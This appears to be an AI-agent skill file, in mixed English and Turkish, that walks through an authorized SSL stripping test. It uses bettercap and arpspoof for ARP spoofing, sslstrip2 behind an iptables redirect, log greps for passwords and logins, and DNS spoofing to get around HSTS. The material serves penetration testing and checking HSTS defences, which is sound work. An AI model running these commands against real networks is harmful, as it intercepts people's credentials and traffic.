---
name: performing-ssl-stripping-attack
description: Simulates SSL stripping attacks using sslstrip, Bettercap, and mitmproxy in authorized environments to test HSTS enforcement, certificate validation, and HTTPS upgrade mechanisms that protect
  users from downgrade attacks on encrypted connections.
tags:
- ssl-stripping
- hsts
- tls-security
- https
- network-security
- fetih
- cybersecurity
- siber-güvenlik
triggers:
- IDS
- IPS
- alert
- api
- attack
- ağ güvenliği
- certificate
- dns
- email
- firewall
- http
- log
category: network-security
source_subdomain: network-security
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
adapted_for: fetih
---

# Performing Ssl Stripping Attack


## Ne Zaman Kullanılır

- Testing whether web applications properly enforce HTTPS through HSTS headers and redirect chains
- Validating that HSTS preloading is correctly configured and registered in browser preload lists
- Demonstrating the risk of cleartext HTTP to stakeholders during authorized security assessments
- Assessing whether internal applications and thick clients validate TLS certificates and reject downgrades
- Training SOC teams to tespit etmeSSL stripping indicators in network traffic

**Kullanma:** against networks or applications without explicit written authorization, to intercept real user credentials, or against production systems during business hours without change management approval.

## Ön Gereksinimler

- Written authorization specifying in-scope applications and approved attack techniques
- Bettercap 2.x or sslstrip2 kurulu: the attacker machine
- ARP spoofing or other MITM positioning established (see ARP spoofing skill)
- IP forwarding enabled on the attacker machine
- Wireshark for verifying attack success and capturing evidence
- Test accounts (not real user credentials) for demonstrating credential interception


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1: Establish MITM Position

```bash
sudo sysctl -w net.ipv4.ip_forward=1

sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on"

sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1 &
```

### Adım 2: Execute SSL Stripping with Bettercap

```bash
sudo bettercap -iface eth0

> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true
> arp.spoof on

> set http.proxy.sslstrip true
> set http.proxy.port 8080
> http.proxy on

> set net.sniff.verbose true
> net.sniff on

```

### Adım 3: Execute SSL Stripping with sslstrip2

```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sudo sslstrip2 -l 10000 -w sslstrip_log.txt

tail -f sslstrip_log.txt | grep -i "pass\|user\|login\|email"

```

### Adım 4: Test HSTS Bypass Techniques

```bash
curl -sI https://target-app.example.com | grep -i strict-transport-security

curl -s "https://hstspreload.org/api/v2/status?domain=example.com" | python3 -m json.tool


sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> set dns.spoof.domains target-app.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on
> set http.proxy.sslstrip true
> http.proxy on

```

### Adım 5: Validate Tespit and Controls

```bash

tshark -i eth0 -f "host 192.168.1.50 and port 80" \
  -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
  -Y "http.request" > ssl_strip_evidence.txt

tshark -i eth0 -f "src host 192.168.1.50 and dst port 80" -c 20

tshark -i eth0 -f "dst port 443 and dst host <real_server_ip>" -c 20


curl -s http://target-app.example.com | grep -i "password\|login"
```

### Adım 6: Clean Up and Report

```bash
> http.proxy off
> arp.spoof off
> quit

sudo iptables -t nat -F PREROUTING

sudo sysctl -w net.ipv4.ip_forward=0

sudo killall sslstrip2 arpspoof 2>/dev/null

ping -c 1 192.168.1.1
```

## Key Concepts

| Term | Definition |
|------|------------|
| **SSL Stripping** | Downgrade attack that intercepts HTTP-to-HTTPS redirects, maintaining encrypted connection to the server while serving cleartext HTTP to the victim |
| **HSTS (HTTP Strict Transport Security)** | HTTP response header that instructs browsers to only connect via HTTPS for a specified duration, preventing SSL stripping in subsequent visits |
| **HSTS Preloading** | Submission of domains to browser-maintained lists that enforce HTTPS from the very first connection, closing the first-visit vulnerability window |
| **Certificate Transparency** | Public logging framework for TLS certificates that enables Tespit of misissued certificates but does not prevent SSL stripping |
| **Mixed Content** | Web pages served over HTTPS that load resources (scripts, images) over HTTP, creating partial downgrade vulnerability |
| **Upgrade-Insecure-Requests** | CSP directive that instructs browsers to upgrade HTTP requests to HTTPS, complementing HSTS for mixed content prevention |

## Tools & Systems

- **Bettercap 2.x**: Network attack framework with integrated SSL stripping, HTTP/HTTPS proxying, and credential sniffing
- **sslstrip2**: Dedicated SSL stripping tool that transparently downgrades HTTPS to HTTP with URL rewriting
- **mitmproxy**: TLS-intercepting proxy that can modify response headers to remove HSTS and other security headers
- **curl**: Command-line tool for testing HSTS headers, redirect chains, and certificate validation
- **hstspreload.org**: Public HSTS preload list checker for verifying domain inclusion in browser preload databases

## Common Scenarios

### Scenario: Testing HSTS Implementation on a Banking Web Application

**Context**: A bank Dağıtılmış HSTS on their online banking portal (banking.example.com) six months ago and wants to verify it effectively prevents SSL stripping. The assessment is authorized to test from a workstation on the same VLAN as the test environment using dedicated test accounts.

**Approach**:
1. Verify HSTS header presence and values: `curl -sI https://banking.example.com | grep -i strict` reveals `max-age=31536000; includeSubDomains; preload`
2. Check HSTS preload status: confirmed the domain is on Chrome and Firefox preload lists
3. Kur: Bettercap with ARP spoofing and SSL stripping against a test workstation
4. Attempt to access banking.example.com from the test workstation -- Chrome refuses connection with NET::ERR_CERT_AUTHORITY_INVALID (HSTS prevents downgrade)
5. Test with a fresh browser profile (no HSTS cache) -- still blocked because domain is preloaded
6. Şunu test et: bank's mobile app -- app successfully connects over HTTP (does not enforce HSTS), exposing credentials in cleartext
7. Test subdomain api.banking.example.com -- not on preload list, SSL stripping succeeds on first visit before HSTS header is cached

**Pitfalls**:
- Testing with a browser that already has HSTS cached for the target domain and concluding HSTS works, when a first-time visitor might be vulnerable
- Not testing subdomains separately -- `includeSubDomains` only works after the parent domain's HSTS header is received
- Forgetting to test mobile applications which may not respect HSTS headers at all
- Not checking for mixed content that could leak session tokens even with HSTS enabled

## Output Format

```
## SSL Stripping Assessment Report

**Test ID**: SSL-STRIP-2024-001
**Target Application**: banking.example.com
**Test Date**: 2024-03-15

### HSTS Configuration

| Property | Value | Status |
|----------|-------|--------|
| HSTS Header Present | Yes | PASS |
| max-age | 31536000 (1 year) | PASS |
| includeSubDomains | Yes | PASS |
| preload | Yes | PASS |
| In Chrome Preload List | Yes | PASS |

### SSL Stripping Test Results

| Target | Client | HSTS Status | Strip Result |
|--------|--------|-------------|--------------|
| banking.example.com | Chrome (cached) | Active | BLOCKED |
| banking.example.com | Chrome (fresh) | Preloaded | BLOCKED |
| banking.example.com | Mobile App | Not Enforced | VULNERABLE |
| api.banking.example.com | Chrome (fresh) | Not Preloaded | VULNERABLE (first visit) |

### Öneriler
1. Implement TLS certificate pinning in the mobile banking app (Critical)
2. Submit api.banking.example.com to HSTS preload list separately
3. Add Content-Security-Policy: upgrade-insecure-requests header
4. Implement certificate transparency monitoring for the domain
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: c536e8497e761cc3
-->

